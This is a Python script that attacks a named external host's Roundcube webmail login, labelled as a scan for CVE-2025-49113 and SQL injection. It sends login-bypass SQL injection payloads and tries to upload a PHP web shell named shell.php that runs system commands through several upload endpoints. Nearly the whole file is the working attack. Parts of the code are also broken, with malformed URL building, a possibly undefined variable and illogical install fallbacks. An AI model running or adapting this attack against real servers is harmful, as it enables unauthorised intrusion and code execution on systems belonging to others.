#!/usr/bin/env python3
import requests
import subprocess
import os
import time

TARGET_URL = "http://waal968.icu/?_task=login"
MALICIOUS_PHP = b"<?php echo 'VULNERABLE'; system('id'); ?>"
UPLOAD_PATHS = ["/roundcubemail/api/v2/file_upload", "/upload.php", "?_task=send"]

def check_sql_injection():
    print("\n[1] Testing SQL Injection (Username Field)...")
    
    payloads = [
        "' OR '1'='1#",
        "admin'%20OR%20'1'='1#pass=test",
        "UNION SELECT user,password FROM users--"
    ]

    for payload in payloads:
        try:
            r = requests.get(f"{TARGET_URL}?user={payload}&pass=admin")
            print(f"  Payload: {payload[:30]}... -> Status: {r.status_code}")
            
            # Check for database errors or success indicators
            content_lower = r.text.lower()
            if "success" in content_lower or "login successful" in content_lower:
                print("  >>> FOUND SQL INJECTION! (Login Bypass)")
                return True, payload
            
            if "sqlstate" in content_lower or "error" in content_lower and "database" in content_lower:
                print("  >>> Database Error Detected!")
                
        except Exception as e:
            pass 
    return False, None

def test_direct_upload():
    print("\n[2] Testing Direct File Upload (Bypassing UI)...")
    
    # Create a temp file with malicious PHP content
    import tempfile
    fd, tmp_path = tempfile.mkstemp(suffix='.php')
    try:
        with open(tmp_path, 'wb') as f:
            f.write(MALICIOUS_PHP)
        
        print(f"  Created test payload at {tmp_path}")
        
        for path in UPLOAD_PATHS:
            url = TARGET_URL + path if path.startswith("/") else TARGET_URL
            try:
                # Use requests with raw file upload simulation
                files = {'file': ('shell.php', MALICIOUS_PHP, 'application/php')}
                
                r = requests.post(url, files=files)
                print(f"  Path {path[:30]}... -> Status: {r.status_code}")
                
                if "executed" in str(r.text).lower() or "vulnerable" in str(r.text).lower():
                    print("  >>> File Upload Executed Successfully!")
                    return True, tmp_path
                    
            except Exception as e:
                pass
                
    finally:
        os.unlink(tmp_path)

if __name__ == "__main__":
    try:
        import requests
    except ImportError:
        print("Installing python-requests...")
        subprocess.run(["sudo", "apt-get", "update"], check=True)
        subprocess.run(["sudo", "apt-get", "install", "-y", "python3-pip"], check=True)
        subprocess.run(["pip", "install", "requests"], check=True)

    print("Starting CVE-2025-49113 & SQLi Scan...")
    
    # Try to install requests if not present (common in WSL minimal envs)
    import sys
    try:
        requests.get("http://example.com", timeout=1)
    except ImportError:
        print("Installing python-requests module...")
        subprocess.run(["sudo", "apt-get", "update"], check=True)
        subprocess.run(["pip3", "install", "-q", "requests"], check=True)

    sql_found, sqli_payload = check_sql_injection()
    
    if not sql_found:
        upload_found, file_path = test_direct_upload()

    print("\n[Scan Complete]")
    if sql_found or upload_found:
        print("VULNERABILITY DETECTED.")
    else:
        print("No obvious vulnerabilities found via these vectors.")

